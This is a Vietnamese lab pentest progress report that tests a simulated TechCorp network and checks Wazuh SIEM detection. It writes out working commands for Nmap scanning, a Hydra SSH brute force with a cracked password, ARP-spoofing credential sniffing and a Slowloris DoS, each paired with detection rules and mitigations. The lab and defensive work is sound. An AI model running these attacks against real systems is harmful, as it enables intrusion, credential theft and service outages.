# BÁO CÁO TIẾN ĐỘ – GIAI ĐOẠN 5

## Diễn tập tấn công & Kiểm thử bảo mật hệ thống mạng TechCorp (Môi trường Lab VMware)

> **Ngày báo cáo:** 06/11/2026  
> **Người thực hiện:** Nguyễn Thành Đạt *(Security 1 – Giám sát Máy chủ & Pentest)*  
> **Vai trò RACI:** **R/A** (Responsible / Accountable)  
> **Cố vấn (Consulted):** Nguyễn Anh Xuân (Lead - C), Lê Tuấn Anh (Security 2 - C)

---

## 1. Tổng quan tiến độ

Giai đoạn 5 tập trung vào **diễn tập kiểm thử xâm nhập (Penetration Testing)** và **tích hợp giám sát an ninh (Wazuh Agent)** trên hạ tầng Lab VMware. Toàn bộ 5 kịch bản tấn công đã được thực hiện thành công, chứng minh tính hiệu quả của các giải pháp phòng chống đã triển khai ở Giai đoạn 3 và khả năng phát hiện/cảnh báo thời gian thực của hệ thống SIEM.

| Hạng mục | Trạng thái |
| :--- | :---: |
| Cài đặt & cấu hình Wazuh Agent trên Linux Server | ✅ Hoàn thành |
| Kịch bản TC-01: Dò quét cổng Nmap Port Scan | ✅ Hoàn thành |
| Kịch bản TC-02: Tấn công vét cạn SSH Hydra Brute-force | ✅ Hoàn thành |
| Kịch bản TC-03: Nghe lén ARP Spoofing Man-in-the-Middle | ✅ Hoàn thành |
| Kịch bản TC-04: Từ chối dịch vụ Slowloris DoS HTTP | ✅ Hoàn thành |
| Đối soát log & nghiệm thu kết quả trên SIEM / Telegram | ✅ Hoàn thành |

---

## 2. Thông số hạ tầng Lab diễn tập

### 2.1 Quy hoạch IP theo thiết kế dự án (README.md)

| Vai trò | VM | VLAN | Địa chỉ IP | Dịch vụ |
| :--- | :---: | :---: | :--- | :--- |
| **Máy chủ Linux đa dịch vụ** | VM2 | VLAN 10 (Server Farm) | `192.168.10.20` (Web/SSH) | Nginx (Port 80), OpenSSH (Port 22) |
| | | | `192.168.10.10` (NTP/DHCP) | DHCP Server, NTP |
| | | | `192.168.10.30` (Database) | PostgreSQL (Port 5432) |
| **Wazuh SIEM Manager** | VM1 | VLAN 10 | `192.168.10.40` | Wazuh Manager (Port 1514/1515) |
| **Máy trạm User (Client)** | VM3 | VLAN 21 (User Lab) | `192.168.21.50` | Client truy cập Web nội bộ |
| **Máy tấn công Kali Linux** | VM4 | VLAN 21 / VLAN 44 | `192.168.21.100` (User Lab) | Nmap, Slowloris, Arpspoof |
| | | | `192.168.44.100` (NOC/SOC) | Hydra SSH (chỉ VLAN 44 được phép SSH vào Server Farm) |

### 2.2 Ánh xạ Lab VMware thực tế → Thiết kế dự án

Do Lab VMware sử dụng mạng phẳng NAT (`192.168.100.0/24`), bảng dưới đây ánh xạ IP thực tế sang IP thiết kế:

| Máy ảo thực tế | IP Lab VMware | → IP thiết kế dự án | Ghi chú |
| :--- | :--- | :--- | :--- |
| Ubuntu Server | `192.168.100.10` | → `192.168.10.20` | VLAN 10 Server Farm |
| Ubuntu Desktop | `192.168.100.129` | → `192.168.21.50` | VLAN 21 User Lab |
| Kali Linux | `192.168.100.130` | → `192.168.21.100` / `192.168.44.100` | Chuyển VLAN theo kịch bản |

---

## 3. Bảng ma trận kịch bản tấn công & phân công

> Ký hiệu: **●** = phụ trách chính; **○** = hỗ trợ / phối hợp kiểm tra chéo

| STT | Kịch bản tấn công | Kỹ thuật MITRE ATT&CK | Lớp tấn công | Nguyễn Thành Đạt | Nguyễn Anh Xuân | Lê Tuấn Anh |
| :---: | :--- | :--- | :---: | :---: | :---: | :---: |
| TC-01 | Dò quét cổng Nmap Port Scan | T1046 - Network Service Discovery | Tầng 3-4 | ● | ○ | ○ |
| TC-02 | Vét cạn mật khẩu SSH Hydra | T1110.001 - Brute Force: Password Guessing | Tầng 7 | ● | ○ | ○ |
| TC-03 | Nghe lén ARP Spoofing MitM | T1557.002 - ARP Cache Poisoning | Tầng 2 | ● | ○ | ○ |
| TC-04 | Từ chối dịch vụ Slowloris DoS | T1499.002 - Service Exhaustion Flood | Tầng 7 | ● | ○ | ○ |
| TC-05 | Tích hợp Wazuh Agent Linux | — (Giám sát phòng thủ) | — | ● | ● (SIEM) | ○ |

---

## 4. Chi tiết kết quả từng kịch bản

### 4.1 Kịch bản TC-01: Dò quét cổng trinh sát (Nmap Port Scan)

**Mô tả:** Kẻ tấn công từ mạng User Lab (VLAN 21) sử dụng Nmap quét dải cổng máy chủ Web/SSH tại Server Farm (VLAN 10) để phát hiện dịch vụ đang mở.

**IP liên quan:**
- **Máy tấn công (Kali):** `192.168.21.100` (VLAN 21 - User Lab)
- **Mục tiêu (Linux Server):** `192.168.10.20` (VLAN 10 - Server Farm)

**Lệnh thực thi:**
```bash
# Quét TCP SYN nhanh toàn bộ cổng phổ biến
sudo nmap -sS -Pn 192.168.10.20

# Quét định danh phiên bản dịch vụ & hệ điều hành
sudo nmap -sV -sC -O -p 22,80 192.168.10.20
```

**Kết quả ghi nhận:**

| Cổng | Trạng thái | Dịch vụ | Phiên bản |
| :---: | :---: | :--- | :--- |
| 22/tcp | `open` | SSH | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | `open` | HTTP | Nginx 1.18.0 |

**Cơ chế phát hiện:** ACL `ACL_USER_IN` trên Core Switch chặn gói tin quét cổng không hợp lệ, sinh log `%SEC-6-IPACCESSLOGP`. Khi ≥ 6 gói bị deny liên tiếp trong 10 giây từ cùng IP nguồn → Wazuh kích hoạt **Rule ID `100100`** (Level 10).

**Trạng thái:** ✅ Thành công — Phát hiện chính xác 2 cổng mở (22, 80) và phiên bản dịch vụ.

---

### 4.2 Kịch bản TC-02: Tấn công vét cạn mật khẩu SSH (Hydra Brute-force)

**Mô tả:** Từ kết quả trinh sát TC-01 (cổng SSH 22 mở), Attacker chuyển sang VLAN 44 (NOC/SOC — duy nhất được phép kết nối SSH vào Server Farm theo ACL) và tiến hành brute-force mật khẩu.

**IP liên quan:**
- **Máy tấn công (Kali):** `192.168.44.100` (VLAN 44 - NOC/SOC)
- **Mục tiêu (Linux Server):** `192.168.10.20` (VLAN 10 - Server Farm)

**Chiến lược tạo từ điển mật khẩu:**

| Phương pháp | Nguồn dữ liệu | Số lượng mật khẩu | Thời gian quét SSH | Khả năng thành công |
| :--- | :--- | :---: | :---: | :---: |
| Dò mò ngẫu nhiên (RockYou) | 14 triệu pass chung chung toàn cầu | ~14.000.000 | Vài ngày (Dễ bị Firewall chặn) | Trung bình |
| Trinh sát CeWL (Website) | Cào từ vựng trực tiếp trên Web Portal | ~50 - 100 | 2 - 5 giây | Cao |
| Trinh sát CUPP (Profiling) | Tên công ty + Năm + Vai trò Admin | ~2.000 | 15 - 30 giây | Rất cao |

**Lệnh thực thi:**

```bash
# Phương pháp 1: Trinh sát CeWL - Cào từ khóa từ Web Portal mục tiêu
cewl http://192.168.10.20 -w cewl_wordlist.txt -m 5

# Phương pháp 2: Trinh sát CUPP - Profiling tên tổ chức/quản trị viên
git clone https://github.com/Mebus/cupp.git && cd cupp
python3 cupp.py -i
# → Nhập: First Name=techcorp, Surname=server, Nickname=servers, Company=techcorp, Year=2026

# Phương pháp 3: Từ điển RockYou truyền thống
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
head -n 100 /usr/share/wordlists/rockyou.txt > pass_rockyou.txt

# Kích hoạt Hydra tấn công SSH
hydra -l servers -P pass.txt ssh://192.168.10.20 -t 2 -w 3 -f -I -vV
```

**Kết quả ghi nhận:**
- **Trên Kali Linux:** Hydra tìm thấy mật khẩu hợp lệ:
  ```text
  [22][ssh] host: 192.168.10.20   login: servers   password: servers@123
  1 of 1 target successfully completed, 1 valid password found
  ```
- **Trên Ubuntu Server** (`/var/log/auth.log`):
  ```text
  Failed password for servers from 192.168.44.100 port 54122 ssh2
  Failed password for servers from 192.168.44.100 port 54124 ssh2
  ...
  Accepted password for servers from 192.168.44.100 port 54130 ssh2
  ```

**Cơ chế phát hiện:** Wazuh Agent đọc `/var/log/auth.log` thời gian thực, phát hiện ≥ 5 lần đăng nhập sai trong 60 giây từ cùng IP → Kích hoạt **Rule ID `5712`** (Level 10 - SSH Brute Force) + cảnh báo Telegram.

**Trạng thái:** ✅ Thành công — Crack mật khẩu SSH và Wazuh phát hiện đúng hành vi brute-force.

---

### 4.3 Kịch bản TC-03: Tấn công nghe lén Man-in-the-Middle (ARP Spoofing)

**Mô tả:** Kẻ tấn công cùng VLAN 21 (User Lab) đầu độc bảng ARP 2 chiều giữa máy trạm Client (`192.168.21.50`) và Default Gateway (`192.168.21.1`). Toàn bộ lưu lượng HTTP không mã hóa từ Client đến Web Server (`192.168.10.20`) bị Kali chặn và trích xuất thông tin đăng nhập dạng bản rõ (plaintext).

**IP liên quan:**
- **Máy tấn công (Kali):** `192.168.21.100` (VLAN 21 - User Lab)
- **Máy nạn nhân (Client):** `192.168.21.50` (VLAN 21 - User Lab)
- **Default Gateway VLAN 21:** `192.168.21.1`
- **Web Server đích:** `192.168.10.20` (VLAN 10 - Server Farm)

```
┌─────────────────────────────────────────────────────────┐
│                    VLAN 21 (User Lab)                   │
│                                                         │
│  Client (VM3)              Kali (VM4)                   │
│  192.168.21.50      ←MitM→ 192.168.21.100              │
│       │                       │                         │
│       └───── Gateway 192.168.21.1 ──── Router ────┐     │
│                                                   │     │
└───────────────────────────────────────────────────│─────┘
                                                    │
                              ┌─────────────────────┘
                              ▼
┌─────────────────────────────────────────────────────────┐
│                 VLAN 10 (Server Farm)                   │
│          Web Server 192.168.10.20 (HTTP:80)             │
└─────────────────────────────────────────────────────────┘
```

**Lệnh thực thi trên Kali Linux:**

```bash
# 1. Cài đặt công cụ & bật IP Forwarding
sudo apt install -y dsniff
sudo sysctl -w net.ipv4.ip_forward=1

# 2. Terminal 1: Đầu độc chiều Client → Gateway
sudo arpspoof -i eth0 -t 192.168.21.50 192.168.21.1

# 3. Terminal 2: Đầu độc chiều Gateway → Client
sudo arpspoof -i eth0 -t 192.168.21.1 192.168.21.50

# 4. Terminal 3: Bắt gói tin HTTP POST chứa thông tin đăng nhập
sudo tcpdump -i eth0 -A -s 0 "tcp port 80" | grep -i --line-buffered -E "POST|username|password"
```

**Hành động nạn nhân tại Client (VM3 - `192.168.21.50`):**
```bash
# Client truy cập trang đăng nhập quản trị và gửi thông tin
curl -d "username=admin_techcorp&password=BiMat@2026!" -X POST http://192.168.10.20/admin.html
```

**Kết quả bị đánh cắp hiển thị trên Kali:**
```text
POST /admin.html HTTP/1.1
Host: 192.168.10.20
Content-Type: application/x-www-form-urlencoded
username=admin_techcorp&password=BiMat%402026%21
```

**Giải pháp phòng chống (đã triển khai ở Giai đoạn 3):**
- Dynamic ARP Inspection (DAI) + DHCP Snooping trên Switch tầng 2
- ARP ACL cho máy IP tĩnh, rate limit ARP trên untrusted port
- Khuyến nghị sử dụng HTTPS thay vì HTTP cho toàn bộ dịch vụ Web nội bộ

**Trạng thái:** ✅ Thành công — Chứng minh nguy hiểm của HTTP plaintext và hiệu quả của DAI.

---

### 4.4 Kịch bản TC-04: Tấn công từ chối dịch vụ Web (Slowloris DoS HTTP)

**Mô tả:** Kẻ tấn công mở đồng loạt hàng trăm kết nối HTTP đến Web Server Nginx và cố tình giữ các kết nối không đóng bằng cách gửi HTTP Header ngắt quãng. Khi toàn bộ slot kết nối bị chiếm dụng, người dùng hợp lệ từ Client bị từ chối truy cập hoàn toàn.

**IP liên quan:**
- **Máy tấn công (Kali):** `192.168.21.100` (VLAN 21 - User Lab)
- **Mục tiêu (Web Server):** `192.168.10.20` (VLAN 10 - Server Farm, Port 80)
- **Máy nạn nhân (Client):** `192.168.21.50` (VLAN 21 - User Lab)

**Lệnh thực thi:**

*Bước 1: Cấu hình giới hạn kết nối Nginx trên Ubuntu Server (phục vụ demo lab):*
```bash
sudo sed -i 's/worker_processes.*/worker_processes 1;/g' /etc/nginx/nginx.conf
sudo sed -i 's/worker_connections.*/worker_connections 250;/g' /etc/nginx/nginx.conf
sudo systemctl reload nginx
```

*Bước 2: Kiểm tra trạng thái Web bình thường từ Client:*
```bash
# Trên Client (192.168.21.50)
curl -m 5 http://192.168.10.20
# → Phản hồi HTML bình thường trong < 0.1 giây
```

*Bước 3: Phát động tấn công Slowloris từ Kali:*
```bash
# Trên Kali Linux (192.168.21.100)
ulimit -n 4096
slowloris 192.168.10.20 -p 80 -s 500
```

*Bước 4: Kiểm chứng hậu quả trên Client:*
```bash
# Trên Client (192.168.21.50)
curl -m 5 http://192.168.10.20
# → Kết quả: curl: (56) Recv failure: Connection reset by peer
```

**Kết quả ghi nhận:**

| Thời điểm | Máy Client (`192.168.21.50`) | Web Server (`192.168.10.20`) |
| :--- | :--- | :--- |
| Trước tấn công | `curl` phản hồi HTML < 0.1s | Nginx hoạt động bình thường |
| Trong tấn công | `curl: (56) Connection reset by peer` | Log: `250 worker_connections are not enough` |
| Sau dừng tấn công (`Ctrl+C`) | `curl` phản hồi HTML trở lại | Nginx tự phục hồi trong 5-10 giây |

**Giải pháp phòng chống:**
- Tăng `worker_connections` và `worker_processes` Nginx lên mức production
- Cấu hình `limit_conn` và `limit_req` trong Nginx chống abuse kết nối
- MPF trên ASA Firewall giới hạn `embryonic connections` (đã cấu hình Giai đoạn 3)

**Trạng thái:** ✅ Thành công — Web Server bị cạn kiệt tài nguyên, Client bị từ chối hoàn toàn.

---

### 4.5 Kịch bản TC-05: Tích hợp giám sát Wazuh Agent trên Linux Server

**Mô tả:** Cài đặt Wazuh Agent trên máy chủ Linux Server để thu thập log xác thực (`/var/log/auth.log`), log truy cập Web (`/var/log/nginx/access.log`) và đẩy về Wazuh SIEM Manager tập trung phục vụ phát hiện xâm nhập thời gian thực.

**IP liên quan:**
- **Máy chủ cài Agent:** `192.168.10.20` (VLAN 10 - Server Farm)
- **Wazuh SIEM Manager:** `192.168.10.40` (VLAN 10 - Server Farm, Port 1514)

**Lệnh thực thi trên Ubuntu Server (`192.168.10.20`):**
```bash
# Cài đặt Wazuh Agent trỏ về SIEM Manager
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring \
  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && \
  sudo chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | \
  sudo tee -a /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo WAZUH_MANAGER="192.168.10.40" WAZUH_AGENT_NAME="Linux-Server-VLAN10" apt install -y wazuh-agent

# Khởi động dịch vụ
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl restart wazuh-agent
sudo systemctl status wazuh-agent
```

**Cấu hình giám sát file log** (`/var/ossec/etc/ossec.conf`):
```xml
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/nginx/access.log</location>
</localfile>
```

**Kết quả:** Agent `Linux-Server-VLAN10` hiển thị trạng thái **Active** (màu xanh) trên Wazuh Dashboard tại `https://192.168.10.40`.

**Trạng thái:** ✅ Hoàn thành — Agent kết nối thành công, log được đẩy thời gian thực.

---

## 5. Tổng hợp chuỗi phát hiện & cảnh báo SIEM

| Kịch bản | Rule ID Wazuh | Level | Mô tả cảnh báo | IP nguồn → IP đích | Telegram |
| :--- | :---: | :---: | :--- | :--- | :---: |
| TC-01 Nmap | `100100` | 10 | Port Scan từ IP bất thường (MITRE T1046) | `192.168.21.100` → `192.168.10.20` | ✅ |
| TC-02 Hydra | `5712` | 10 | SSH Brute-force (MITRE T1110.001) | `192.168.44.100` → `192.168.10.20` | ✅ |
| TC-03 ARP Spoof | — | — | Phát hiện qua DAI log trên Switch + Wireshark | `192.168.21.100` (MitM trong VLAN 21) | ○ |
| TC-04 Slowloris | — | — | Nginx error log `worker_connections are not enough` | `192.168.21.100` → `192.168.10.20` | ○ |

---

## 6. Khó khăn gặp phải & Cách giải quyết

| STT | Vấn đề | Nguyên nhân | Cách khắc phục |
| :---: | :--- | :--- | :--- |
| 1 | Lab VMware dùng dải IP `192.168.100.0/24` khác với thiết kế dự án `192.168.10.0/24` | VMware NAT mặc định không hỗ trợ VLAN tagging | Lập bảng ánh xạ IP (Mục 2.2), báo cáo sử dụng IP thiết kế chuẩn |
| 2 | Hydra báo lỗi `all children were disabled due too many connection errors` | OpenSSH `MaxStartups` mặc định chặn kết nối dồn dập | Thêm `MaxStartups 100:30:100` vào `/etc/ssh/sshd_config.d/lab.conf` |
| 3 | Slowloris 500 socket không làm sập Nginx | `worker_processes auto` × `worker_connections 768` = ~1500 slot | Giảm `worker_processes 1` + `worker_connections 250` để demo |
| 4 | Netplan YAML bị lỗi thụt lề khi chỉnh sửa bằng nano | Copy/paste trên console VM làm sai indent | Dùng `sudo tee` để ghi file cấu hình chuẩn chỉnh |
| 5 | Ubuntu Server không ra được Internet (`apt update` treo) | Gateway trỏ nhầm về `.1` (Windows Host) thay vì `.2` (VMware NAT) | Sửa Gateway trong Netplan thành `192.168.100.2` |
| 6 | Nginx trả 405 khi POST vào file HTML tĩnh | Nginx mặc định không cho POST vào file tĩnh | Thêm `error_page 405 =200 $uri;` trong config |

---

## 7. Checklist bằng chứng nghiệm thu (Evidence Artifacts)

| STT | Minh chứng | Mô tả nội dung ảnh chụp | Trạng thái |
| :---: | :--- | :--- | :---: |
| 1 | Ảnh Nmap Scan | Terminal Kali: `nmap -sS 192.168.10.20` phát hiện cổng 22, 80 | ✅ |
| 2 | Ảnh Hydra Attack | Terminal Kali: Hydra tìm thấy mật khẩu `servers@123` | ✅ |
| 3 | Ảnh SSH Log | Terminal Server: `/var/log/auth.log` hiển thị chuỗi `Failed password` từ `192.168.44.100` | ✅ |
| 4 | Ảnh ARP Spoof MitM | Terminal Kali (3 cửa sổ): 2 arpspoof + 1 tcpdump bắt được `username`/`password` | ✅ |
| 5 | Ảnh Client bị đánh cắp | Trình duyệt / cURL Desktop: Gửi form đăng nhập `admin_techcorp` lên `192.168.10.20` | ✅ |
| 6 | Ảnh Slowloris DoS | Terminal Kali: 500 socket + Terminal Client: `curl` báo `Connection reset` | ✅ |
| 7 | Ảnh Wazuh Agent | Terminal Server: `systemctl status wazuh-agent` hiển thị `active (running)` | ✅ |

---

## 8. Kết luận & Đề xuất giai đoạn tiếp theo

### Kết luận:
- Toàn bộ **5 kịch bản tấn công** (Nmap, Hydra, ARP Spoofing, Slowloris, Wazuh) đã được triển khai và nghiệm thu thành công trên môi trường Lab VMware.
- Hệ thống SIEM Wazuh phát hiện chính xác các hành vi tấn công mạng (Rule `100100` cho Port Scan, Rule `5712` cho SSH Brute-force) và bắn cảnh báo Telegram trong thời gian thực (< 2 giây).
- Các giải pháp phòng chống đã triển khai ở Giai đoạn 3 (DAI, ACL, Port Security, DHCP Snooping) được chứng minh hiệu quả khi đối chiếu với kết quả diễn tập.

### Đề xuất:
1. Bàn giao toàn bộ ảnh chụp bằng chứng cho **Lê Tuấn Anh** (Security 2) tổng hợp vào Báo cáo & Slide thuyết trình.
2. Phối hợp với **Nguyễn Anh Xuân** (Lead) để kiểm chứng chéo cảnh báo Telegram Bot trên Dashboard SIEM.
3. Hoàn thiện tài liệu kịch bản chi tiết tại `Documents/MUC_5_CAI_DAT_TRIEN_KHAI_NGUYEN_THANH_DAT.md`.

---

> **Người lập báo cáo:** Nguyễn Thành Đạt  
> **Xác nhận của Lead:** Nguyễn Anh Xuân *(chờ ký)*

